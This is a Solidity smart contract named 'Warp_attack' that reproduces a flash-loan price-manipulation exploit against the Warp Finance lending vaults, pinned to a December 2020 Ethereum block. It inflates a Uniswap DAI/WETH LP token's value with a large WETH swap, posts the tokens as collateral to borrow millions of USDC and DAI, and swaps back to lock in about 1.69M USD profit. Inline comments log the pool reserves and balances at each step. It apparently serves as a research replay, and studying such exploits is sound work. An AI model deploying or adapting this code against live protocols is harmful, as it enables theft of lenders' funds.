// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interface.sol";
// Block 11473330
// Block index 65
// Timestamp Thu, 17 Dec 2020 22:24:41 +0000
// Gas price 89 gwei
// Gas limit 3656990
// 


contract Warp_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAIAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UniswapDAT2ETHAdress = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address private constant UniswapSoloMarginAddress = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;
    address private constant WarpVaultLPAddress = 0x13db1CB418573f4c3A2ea36486F0E421bC0D2427;
    address private constant WarpControlAddress = 0xBa539B9a5C2d412Cb10e5770435f362094f9541c;
    address private constant WarpUSDCVaultSCAddress = 0xae465FD39B519602eE28F062037F7B9c41FDc8cF;
    address private constant WarpDAIValutSCAddress = 0x6046c3Ab74e6cE761d218B9117d5c63200f4b406;
    address private constant USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant SushiswapUSDC2ETHAddress = 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0;

    IUniswapV2Pair UNI_V2 = IUniswapV2Pair(UniswapDAT2ETHAdress);  // token0 = DAI   token1 = WETH
    IUniswapV2Router02 UNIV2_router = IUniswapV2Router02(UniswapV2Router02Address);

    IERC20 WETH = IERC20(WETHAddress);
    IERC20 DAI = IERC20(DAIAddress);
    IERC20 USDC = IERC20(USDCAddress);
    WarpVaultLP warpVaultLP = WarpVaultLP(WarpVaultLPAddress);
    WarpControl warpControl = WarpControl(WarpControlAddress);

    address private constant comptrollerAddress = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address private constant cETHAddress = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address private constant cDAIAddress = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
    ICEther cETH = ICEther(payable(cETHAddress));
    CTokenInterface cDAI = CTokenInterface(cDAIAddress);

    uint reserve0 = 0;
    uint reserve1 = 0;
    uint balance = 0;
    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    string str80 = "";
    string str81 = "";
    string str82 = "";

    uint DAIamount;
    uint AmountIn;
    uint WETHIn;
    uint DAIOut;
    uint liquidity;


    constructor() payable {
        require(msg.value == 500000 ether, "loan amount does not match");
        DAI.approve(UniswapSoloMarginAddress, 2**256 - 1);
        WETH.approve(UniswapSoloMarginAddress, 2**256 - 1);
        UNI_V2.approve(WarpVaultLPAddress, 2**256 - 1);
        EOA = msg.sender;
        IWETH(WETHAddress).deposit{ value: 500000 ether }();
    }

    receive() external payable {}


    // loan amount = 500,000 WETH and 5 million DAI
    function attack0() public {
        // action 1: (1 parameter)WETH, DAI -> LP  State: Uniswap
        //           State: Uniswap

        // str1 = UNI_V2Summary();

        DAIamount = 2900030 * 10 ** 18;
        (reserve0, reserve1, ) = UNI_V2.getReserves();
        WETH.transfer(UniswapDAT2ETHAdress, DAIamount * reserve1 / reserve0 );
        DAI.transfer(UniswapDAT2ETHAdress, DAIamount );
        UNI_V2.mint(address(this));
        
        // liquidity = UNI_V2.balanceOf(address(this)) / 10 ** 18;
        // str2 = UNI_V2Summary();
        // revert(appendWithSpace(appendWithSpace(str1 , str2), uint2str(liquidity)));

        //  DAI Liquidity: 58010988 
        // WETH Liquidity: 90409 
        // DAI Liquidity: 60911018 
        // WETH Liquidity: 94928 
        // 94349



        // action 2: WETH -> DAI  State: Uniswap
        //             State: Uniswap
        
        // str1 = UNI_V2Summary();

        WETHIn = 341217 * 10 ** 18;
        (reserve0,  reserve1, ) = UNI_V2.getReserves();
        WETH.transfer(UniswapDAT2ETHAdress, WETHIn);
        DAIOut = 997 * WETHIn * reserve0 / (1000 * reserve1 + 997 * WETHIn);
        UNI_V2.swap(DAIOut, 0, address(this), new bytes(0));

        // str2 = UNI_V2Summary();
        // revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(DAIOut / 10 ** 18)));
        
        // DAI Liquidity: 60911018 
        // WETH Liquidity: 94928 
        // DAI Liquidity: 13288689 
        // WETH Liquidity: 436145 
        // 47622329


        // action 3: LP -> BorrowLimit  State: Uniswap    Execute once
        // str1 = UNI_V2Summary();

        warpVaultLP.provideCollateral(94349 * 10 ** 18);

        // uint limit = warpControl.getBorrowLimit(address(this));
        // revert(appendWithSpace(str1, uint2str(limit / 10 ** 6)));

        // DAI Liquidity: 13288689 
        // WETH Liquidity: 436145 
        // 8520996
        
        

        // action 4: BorrowLimit -> USDC (given)   State: Warp
        //           State: BorrowLimit

        // uint limit = warpControl.getTotalBorrowedValue(address(this)) / 10 ** 6;
        // uint USDCgot = USDC.balanceOf(address(this));
        
        warpControl.borrowSC(USDCAddress, 3917983 * 10 ** 6);

        // uint limit2 = warpControl.getTotalBorrowedValue(address(this)) / 10 ** 6;
        // USDCgot = (USDC.balanceOf(address(this)) - USDCgot ) / 10 ** 6;
        // revert( appendWithSpace(uint2str(limit), appendWithSpace(uint2str(USDCgot), uint2str(limit2)) ) );

        // 0 3917983 3917983




        // action 5: BorrowLimit -> DAI (given)   State: Warp
        //           State: BorrowLimit

        // uint limit = warpControl.getTotalBorrowedValue(address(this)) / 10 ** 6;
        // uint DAIgot = DAI.balanceOf(address(this));

        warpControl.borrowSC(DAIAddress, 3862646 * 10 ** 18);

        // uint limit2 = warpControl.getTotalBorrowedValue(address(this)) / 10 ** 6;
        // DAIgot = (DAI.balanceOf(address(this)) - DAIgot ) / 10 ** 18;
        // revert( appendWithSpace(uint2str(limit), appendWithSpace(uint2str(DAIgot), uint2str(limit2)) ) );
        
        // 3917983 3862646 7787516




        // action 6: DAI -> WETH  State: Uniswap
        //             State: Uniswap

        // str3 = UNI_V2Summary();
        // uint WETHOut = WETH.balanceOf(address(this));
        
        DAIamount = 47622329 * 10 ** 18;
        (reserve0,  reserve1, ) = UNI_V2.getReserves();
        DAI.transfer(UniswapDAT2ETHAdress, DAIamount);
        UNI_V2.swap(0, 997 * DAIamount * reserve1 / (1000 * reserve0 + 997 * DAIamount), address(this), new bytes(0));

        // str4 = UNI_V2Summary();
        // WETHOut = (WETH.balanceOf(address(this)) - WETHOut) / 10 ** 18;
        // revert(appendWithSpace(appendWithSpace(str3, str4), uint2str(WETHOut) ));

        // DAI Liquidity: 13288689 
        // WETH Liquidity: 436145 
        // DAI Liquidity: 60911018 
        // WETH Liquidity: 95375 
        // 340769

        // revert(ProfitSummary());
        // loan amount = 500000 ETH and 5 million DAI
        // USDC balance: 3917983 || DAI balance: 5962616 || WETH balance: 495033
        // 1 WETH = 641.65 DAI;  1 USDT = 1 DAI
        // Profit = 3917983 + 5962616 - 5000000 - (500000 - 495033) * 641.65 = 1693523.45 usd

        // ======================== start swapping  ====================================
        IOneSplitAudit OneSplitAudit = IOneSplitAudit(0xC586BeF4a0992C495Cf22e1aeEE4E446CECDee0E);
        uint USDCdiff = USDC.balanceOf(address(this));
        if(USDCdiff > 0){
          (uint returnAmount, uint256[] memory distribution) = OneSplitAudit.getExpectedReturn(address(USDC), address(DAI), USDCdiff, 10, 0);
          USDC.approve(address(OneSplitAudit), 0);
          USDC.approve(address(OneSplitAudit), 2**256 - 1);
          OneSplitAudit.swap(address(USDC), address(DAI), USDCdiff, 0, distribution, 0);      
        }

        if(DAI.balanceOf(address(this)) > 5000000e18){
            uint DAIdiff = DAI.balanceOf(address(this)) - 5000000e18;
            (uint returnAmount, uint256[] memory distribution) = OneSplitAudit.getExpectedReturn(address(DAI), address(WETH), DAIdiff, 10, 0);
            DAI.approve(address(OneSplitAudit), 0);
            DAI.approve(address(OneSplitAudit), 2**256 - 1);
            OneSplitAudit.swap(address(DAI), address(WETH), DAIdiff, 0, distribution, 0);   
        }

        revert(ProfitSummary());

    }
    

    function UNI_V2Summary() internal returns (string memory _uintAsString){
        (reserve0, reserve1, ) = UNI_V2.getReserves();
        str80 = append("DAI Liquidity: ", uint2str(reserve0 / 10 ** 18));
        str81 = append(" || WETH Liquidity: ", uint2str(reserve1 / 10 ** 18));
        return append(str80, str81);
    } 

    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = USDC.balanceOf(address(this)) / 10 ** 6;
        uint balance2 = DAI.balanceOf(address(this)) / 10 ** 18;
        uint balance3 = WETH.balanceOf(address(this)) / 10 ** 18;
        str80 = append("USDC balance: ", uint2str(balance1));
        str81 = append(" || DAI balance: ", uint2str(balance2));
        str82 = append(" || WETH balance: ", uint2str(balance3));
        return append(append(str80, str81), str82);
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }

}